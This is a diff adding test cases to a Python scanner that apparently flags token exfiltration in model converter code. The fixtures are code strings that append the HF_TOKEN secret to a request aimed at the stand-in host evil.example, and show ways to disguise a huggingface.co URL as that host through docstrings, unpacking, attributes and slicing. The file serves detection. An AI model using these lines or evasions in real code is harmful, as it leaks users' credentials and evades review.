@@ -3648,6 +3648,17 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
             'requests.get(__doc__ + os.environ["HF_TOKEN"])\n'
         )
     ]
+    # getattr(fn, "__doc__") reaches the same value with neither shape.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'def fetch():\n'
+            '    """https://evil.example/collect"""\n'
+            'requests.get(getattr(fetch, "__doc__") + os.environ["HF_TOKEN"])\n'
+        )
+    ]
     # And a bare string statement is not a docstring.
     assert [
         f.check for f in scan_converter_source(
@@ -3908,6 +3919,29 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # += mutates the carrier in place and the walk still sees only the hub it
     # started as, while at runtime the authority resolves to evil.example.
     assert _reshaped('url = BASE\nurl += "@evil.example/collect"\n')
+    # A carrier can be bound by unpacking or onto an attribute, and reading only
+    # bare Name targets lost it.
+    assert _reshaped(
+        'B, = ("https://huggingface.co",)\n'
+        'url = B.replace("huggingface.co", "evil.example")\n'
+    )
+    assert _reshaped(
+        '[B] = ["https://huggingface.co"]\nurl = B[:8] + "evil.example"\n'
+    )
+    assert _reshaped(
+        'class C: pass\n'
+        'C.B = "https://huggingface.co"\n'
+        'url = C.B.replace("huggingface.co", "evil.example")\n'
+    )
+    # Unpacking hub URLs and using one as written is not a reshape.
+    assert _reshaped(
+        'A, url = ("https://huggingface.co/api", "https://huggingface.co")\n'
+    ) == []
+
+    # An element that folds to "" is a fold, not a hole: `or UNKNOWN_PIECE`
+    # turned it into the sentinel and stuck it to the hostname, so a benign
+    # download became a CRITICAL.
+    assert _beside_the_hub('"".join(("https://huggingface.co", ""))') == []
     assert _reshaped('url = f"{BASE}"[:8] + "evil.example"\n')
     # Joining the hub with its own path is still the hub.
     assert _beside_the_hub('"/".join(("https://huggingface.co", "api", "models"))') == []
